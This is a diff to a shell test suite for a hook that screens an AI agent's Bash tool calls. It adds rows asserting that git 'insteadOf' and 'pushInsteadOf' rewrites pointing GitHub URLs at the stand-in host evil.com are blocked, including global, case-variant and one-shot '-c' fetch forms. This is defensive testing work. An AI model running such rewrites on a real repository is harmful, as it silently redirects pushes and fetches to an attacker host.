@@ -38,6 +38,7 @@ mkrepo "$T/mainrepo"  "main"
 mkrepo "$T/featrepo"  "feat/x"
 MAIN="$T/mainrepo"
 FEAT="$T/featrepo"
+SWR="$T/swrepo"; mkrepo "$SWR" "feat/x"; touch "$SWR/.single-writer"  # class (b) exempt, so class (a) rows are not masked (HIMMEL-844)
 # A SEPARATE, deliberately /tmp-rooted fixture (unlike $T above) — used by
 # exactly one row below to assert the RATIFIED is_temp_or_devnull `*/tmp/*`
 # exemption on purpose, not by accident.
@@ -77,6 +78,14 @@ check "remote set-url rewrite denied"    block '{"tool_name":"Bash","tool_input"
 check "config url rewrite denied"        block '{"tool_name":"Bash","tool_input":{"command":"git config remote.origin.url http://x"}}'
 check "config url READ allowed"          allow '{"tool_name":"Bash","tool_input":{"command":"git config --get remote.origin.url"}}'
 check "config --file url rewrite denied"  block '{"tool_name":"Bash","tool_input":{"command":"git config --file .git/config remote.origin.url http://x"}}'
+check "config insteadOf rewrite" block '{"tool_name":"Bash","tool_input":{"command":"git config url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
+check "config pushInsteadOf rewrite" block '{"tool_name":"Bash","tool_input":{"command":"git config url.https://evil.com/.pushInsteadOf https://github.com/","cwd":"'"$SWR"'"}}'
+check "config --global insteadOf rewrite" block '{"tool_name":"Bash","tool_input":{"command":"git config --global url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
+check "config insteadof case variant" block '{"tool_name":"Bash","tool_input":{"command":"git config URL.https://evil.com/.INSTEADOF https://github.com/","cwd":"'"$SWR"'"}}'
+check "git -c insteadOf one-shot fetch" block '{"tool_name":"Bash","tool_input":{"command":"git -c url.https://evil.com/.insteadOf=https://github.com/ fetch","cwd":"'"$SWR"'"}}'
+check "config --get insteadOf READ allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config --get url.https://x/.insteadOf","cwd":"'"$SWR"'"}}'
+check "config user.name allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config user.name x","cwd":"'"$SWR"'"}}'
+check "remote -v allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git remote -v","cwd":"'"$SWR"'"}}'
 check "gh pr create denied"              block '{"tool_name":"Bash","tool_input":{"command":"gh pr create --fill"}}'
 check "gh pr view allowed"               allow '{"tool_name":"Bash","tool_input":{"command":"gh pr view 12"}}'
 check "gh issue list allowed"            allow '{"tool_name":"Bash","tool_input":{"command":"gh issue list"}}'
